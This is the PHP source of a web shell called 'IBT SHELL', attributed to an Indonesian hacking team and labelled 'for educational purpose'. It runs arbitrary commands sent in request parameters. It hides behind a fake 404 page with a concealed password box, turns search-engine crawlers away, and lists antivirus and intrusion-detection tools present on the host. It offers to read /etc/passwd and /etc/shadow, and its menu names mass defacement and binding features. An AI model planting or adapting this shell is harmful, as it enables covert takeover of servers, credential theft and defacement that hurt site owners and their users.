<?php
/*
SHELL INDONESIAN BACKTRACK TEAM
AUTHOR : CEEMDE aka PARIKESIT
KURAWA IBT
DATE : 30/11/2014
COPYRIGHT : MIT LICENSE
FOR EDUCATIONAL PURPOSE
*/

session_start();
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
?>

<html>
<head>
<title>IBT SHELL</title>
<style>
body {
margin:0;
color:#fff;
letter-spacing:0.5px;
/* Location of the image */
background-image: url(ibt.png);
/* Background image is centered vertically and horizontally at all times */
background-position: center center;
/* Background image doesn't tile */
background-repeat: no-repeat;
/* Background image is fixed in the viewport so that it doesn't move when 
the content's height is greater than the image's height */
background-attachment: fixed;
/* This is what makes the background image rescale based
on the container's size */
background-size: cover;
/* Set a background color that will be displayed
while the background image is loading */
background-color: #464646 ;
}
p{
font-size:14px;
line-height:24px;
}
table{
background:rgba(0,0,0,0.9);
}
a{
text-decoration:none;
color:red;
}
.overlay{
position:absolute;
#background:rgba(0,0,0,0.75);
width:100%;
height:100%;
left:0;
top:0;
right:0;
z-index:-1;
}
</style>
</head>
<body>

<?php
//Check User Agent
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "facebook","yahoo");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
	}	
}

//Check Login
if(isset($_POST['password']) && isset($_GET['key'])){
	$pass = $_POST['password'];
	$key = $_GET['key'];
	if($pass == "hasny" && $key == "ganteng"){
		$_SESSION['login'] = "Masuk";
	}
}

//Logout
if(isset($_GET['action']) & $_GET['action']=="logout"){
	session_start();
	session_destroy();
	$serv = htmlentities($_SERVER['PHP_SELF']);
	header('location:'.$serv);
}

//Cek HDD
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

//Cek Warna Permission
function viewPermsColor($f) { 
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}

//Cek Permission
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

//Cek Drive
	$drives = "";
	if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
		foreach( range('a','z') as $drive )
		if (is_dir($drive.':\\'))
			$drives .= '<a href="?file='.$drive.':" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}

//Function Ex
function ex($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
	
//Cek Security
function actionSecInfo() {

	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>'.$n.': </span>';
			if(strpos($v, "\n") === false)
				echo $v.'<br>';
			else
				echo '<pre class=ml1>'.$v.'</pre>';
		}
	}
	
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
	if(function_exists('apache_get_modules'))
       	showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	
	if( $GLOBALS['os'] == 'nix' ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
		showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
		showSecParam('OS version', @file_get_contents('/proc/version'));
		showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			echo '<br>';
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			showSecParam('Downloaders', implode(', ',$temp));
			echo '<br/>';
			showSecParam('Hosts', @file_get_contents('/etc/hosts'));
			showSecParam('HDD space', ex('df -h'));
			showSecParam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		showSecParam('OS Version',ex('ver')); 
		showSecParam('Account Settings',ex('net accounts')); 
		showSecParam('User Accounts',ex('net user'));
	}
	echo '</div>';

}
//Disable Function
$disable_functions = @ini_get('disable_functions');

//Execute Function

if(!function_exists('execute')){
	function execute($code){
		$output = "";
		$code = $code." 2>&1";

		if(is_callable('system') && function_exists('system')){
			ob_start();
			@system($code);
			$output = ob_get_contents();
			ob_end_clean();
			if(!empty($output)) return $output;
		}
		elseif(is_callable('shell_exec') && function_exists('shell_exec')){
			$output = @shell_exec($code);
			if(!empty($output)) return $output;
		}
		elseif(is_callable('exec') && function_exists('exec')){
			@exec($code,$res);
			if(!empty($res)) foreach($res as $line) $output .= $line;
			if(!empty($output)) return $output;
		}
		elseif(is_callable('passthru') && function_exists('passthru')){
			ob_start();
			@passthru($code);
			$output = ob_get_contents();
			ob_end_clean();
			if(!empty($output)) return $output;
		}
		elseif(is_callable('proc_open') && function_exists('proc_open')){
			$desc = array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"));
			$proc = @proc_open($code, $desc, $pipes, getcwd(), array());
			if(is_resource($proc)){
				while($res = fgets($pipes[1])){
					if(!empty($res)) $output .= $res;
				}
				while($res = fgets($pipes[2])){
					if(!empty($res)) $output .= $res;
				}
			}
			@proc_close($proc);
			if(!empty($output)) return $output;
		}
		elseif(is_callable('popen') && function_exists('popen')){
			$res = @popen($code, 'r');
			if($res){
				while(!feof($res)){
					$output .= fread($res, 2096);
				}
				pclose($res);
			}
			if(!empty($output)) return $output;
		}
		return "";
	}
}

// ================================
// if user is logged in
if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
// welcome user
?>

<div class="overlay"></div>
		<?php
		if(isset($_GET['action']) & $_GET['action']=="phpinfo"){
		die(phpinfo());
		
		}
		?>
	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
		<tr>
			<td>
					<p align="left"><?php 
								echo "Server Time : ".date("d-m-Y H:i:s")." (GMT + 7)<br />";
								echo "Software : ". $_SERVER['SERVER_SOFTWARE']."  ";
								echo "<a href='?action=phpinfo' target='_blank'>PHP Info</a> /"; 
								//Check Mysql
								if(function_exists('mysql_connect')){
								echo ' Mysql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mysql : <font color="red"> OFF</font> / ';
								}
								//Check Mssql
								if(function_exists('mssql_connect')){
								echo ' Mssql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mssql : <font color="yellow"> OFF</font> / ';
								}
								//Check Oracle
								if(function_exists('ocilogon')){
								echo ' Oracle : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Oracle : <font color="yellow"> OFF</font> / ';
								}
								//Check PostgreSQL
								if(function_exists('pg_connect')){
								echo ' PostgreSQL : <font color="green"> ON</font> / ';
								}
								else{
								echo ' PostgreSQL : <font color="yellow"> OFF</font> / ';
								}
								//Check Curl
								if(function_exists('curl_version')){
								echo ' Curl : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Curl : <font color="yellow"> OFF</font> / ';
								}
								//Check Sockets
								
								//Check Exec
								if(function_exists('exec')){
								echo ' Exec : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Exec : <font color="yellow"> OFF</font> / ';
								}
								//Check Openbasedir
								if(!ini_get('open_basedir') != "on"){
								echo ' Open_basedir : <font color="yellow"> OFF</font> / ';
								}
								else{
								echo ' Open_basedir : <font color="green"> ON</font> / ';
								}
								//Check Ini Restore
								if(!ini_get('ini_restore') != "on"){
								echo ' Ini restore : <font color="yellow"> OFF</font> / ';
								}
								else{
								echo ' Ini restore : <font color="green"> ON</font> / ';
								}
								//Check Magic Quotes
								if(ini_get('magic_quotes_gpc') == '1'){
									echo ' Magic_quotes_gpc : <font color="red"> ON</font> / ';
								}
								else{
									echo ' Magic_quotes_gpc : <font color="yellow"> OFF </font> /';
								}
								//Check Wget
								$check = strtolower(execute("wget -h"));
								if(strpos($check,"usage")!==false) $wget = "on";
								if($wget == "on"){
									echo ' Wget : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Wget : <font color="yellow"> OFF</font> / ';
								}
								//Check Gcc
								$check = strtolower(execute("gcc --help"));
								if(strpos($check,"usage")!==false) $gcc = "on";
								if($gcc == "on"){
									echo ' Gcc : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Gcc : <font color="yellow"> OFF</font> / ';
								}
								//Check Perl
								$check = strtolower(execute("perl -h"));
								if(strpos($check,"usage")!==false) $perl = "on";
								if($perl == "on"){
									echo ' Perl : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Perl : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Python
								$check = strtolower(execute("python -h"));
								if(strpos($check,"usage")!==false) $python = "on";
								if($python == "on"){
									echo ' Python : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Python : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Ruby
								$check = strtolower(execute("ruby -h"));
								if(strpos($check,"usage")!==false) $ruby = "on";
								if($ruby == "on"){
									echo ' Ruby : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Ruby : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Node
								$check = strtolower(execute("node -h"));
								if(strpos($check,"usage")!==false) $node = "on";
								if($node == "on"){
									echo ' node : <font color="green"> ON</font> / ';
								}
								else{
									echo ' node : <font color="yellow"> OFF</font> / ';
								}
								
								//Check NodeJs
								$check = strtolower(execute("nodejs -h"));
								if(strpos($check,"usage")!==false) $nodejs = "on";
								if($nodejs == "on"){
									echo ' nodejs : <font color="green"> ON</font> / ';
								}
								else{
									echo ' nodejs : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Java
								$check = strtolower(execute("java -help"));
								if(strpos($check,"usage")!==false){
								$check = strtolower(execute("java -help"));
								if(strpos($check,"usage")!==false) {$java = "on";
								}}
								if($java == "on"){
									echo ' java : <font color="green"> ON</font> <br /> ';
								}
								else{
									echo ' java : <font color="yellow"> OFF</font> <br /> ';
								}																
								?>
								<?php

								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
								
								if(ini_get('safe_mode') == '1'){
									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
								}
								else{
									echo 'Safe mode:<font color="green"> OFF </font><br />';
								} 
								if( isset( $_POST['c'] ) )
								@chdir($_POST['c']);
								$cwd = @getcwd();
								$GLOBALS['cwd'] = @getcwd();
								$freeSpace = @disk_free_space($GLOBALS['cwd']);
								$totalSpace = @disk_total_space($GLOBALS['cwd']);
								$home_cwd = @getcwd();

								$cwd_links = '';
								$path = explode("/", $GLOBALS['cwd']);
								$n=count($path);
								for($i=0;$i<$n-1;$i++) {
									$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
									for($j=0;$j<=$i;$j++){
										$cwd_links .= $path[$j].'/';
									$cwd_links .= "\")'>".$path[$i]."/</a>";
									}
								}
								
								?>
								
								<?php echo 'Directory : '.$cwd.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
								<br />Detected drives: <?=$drives?><br />
								Disabled Functions : <?php if($disable_functions ==""){
								echo "None ";}else{
								echo $disable_funstions;
								} ?> (Bypass)<br />
					</p>
			</td>
		</tr>		
		<?php
			//Exec Form
			if(isset($_GET['cmd'])){
		?>
		<tr>
		<td>
		<?php
		//Filter Command For Windows And For Unix
		$command = $_GET['cmd'];
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			if(preg_match("/ifconfig/", $command)||preg_match("/ls/", $command)||preg_match("/cat/", $command)||preg_match("/grep/", $command)||preg_match("/wget/", $command)||preg_match("/apt-get/", $command)||preg_match("/install/", $command)||preg_match("/mkdir/", $command)){
				echo '<font color="red"><b>This command not work on windows!</b></font><br />';
			}
		}
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI') {
			if(preg_match("/ls/", $command)||preg_match("/tree/", $command)||preg_match("/cd../", $command)){
				echo '<font color="red"><b>This command not work on linux!</b></font><br />';
			}
		} 
		?>
		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
		</tr>
		<?php
		}
		?>
		<?php
		//Show Security Information
		if(isset($_GET['action']) & $_GET['action']=="secinfo"){
		echo "<tr><td>";
		echo actionSecInfo();
		echo "</td></tr>";
		}
		?>
		<tr>
			<td style="font-size:14px;">
			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
			<a href="?action=">Mysql</a> | 
			<a href="?action=">Symlink</a> | 
			<a href="?action=">Mass Deface</a> | 
			<a href="?action=">Hasher</a> | 
			<a href="?action=">Bind</a> | 
			<a href="?action=secinfo">Sec Info</a> |
			<a href="?action=">Terminal</a> | 
			<a href="?action=">Self-Destroy</a> | 
			<a href="?action=logout">Logout</a>			
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="background:transparent;" cellspacing="7px">
					<tr style="font-weight:bold;"><td>Nama</td><td>Size</td><td>Last Edit</td><td>Perm</td><td>Action</td></tr>
					<tr style="font-size:12px;"><td>.</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>..</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>tools/</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>index.php</td><td>100 KB</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>config.php</td><td>22 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="font-size:14px;background:transparent;" cellpadding="20px">
					<tr>
						<td>
							Upload : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/><br /><br /><input type="file" name="file" /> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Change Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value="C:/xampp/htdocs/shell""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							<?php 
						if(isset($_GET['mkdir'])){
						system("mkdir ".$_GET['mkdir']);
						echo " Created ";
						}
						?>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Make Dir : <br /><input type="text" placeholder="C:\xampp\htdocs\shell\namafolder" name="mkdir" value=""/> <input type="submit" name="submit" value="Send"/>
						    </form>
						</td>
						<td>
							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make File : <br /><input type="text" placeholder="file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Execute : <br /><input type="text" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
					<tr>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Ready Command : <br />
												  <?php 
													if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
												  ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv </option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="dir">List Directory</option>
												  <option value="start cmd.exe">Jalankan Cmd</option>
												  </select> 
												  <?php }else{ ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv</option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="ls -la">List All hiden File</option>
												  <option value="ls">List Directory</option>
												  <option value="uname -a">Information Kernel</option>
												  <option value="cat /etc/passwd">Read /etc/passwd</option>
												  <option value="cat /etc/hosts">Read /etc/hosts</option>
												  </select> 												  
												  <?php } ?>
												 
							<input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<p style="text-align:center;font-weight:bolder;">Copyright Indonesian Backtrack Team</p>
			</td>
		</tr>
	</table>

	
<?php
}else{
?>
<body style="margin:10px;background:#fff;color:#000;overflow:hidden;cursor:none;">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
<form method="post" action="<?php $_SERVER['PHP_SELF'];?>" >
<input type="password" name="password" style="background:transparent;outline:none;border:none;color:#fff;cursor:none;">
</form>
<?php
}
?>
</body>
</html>


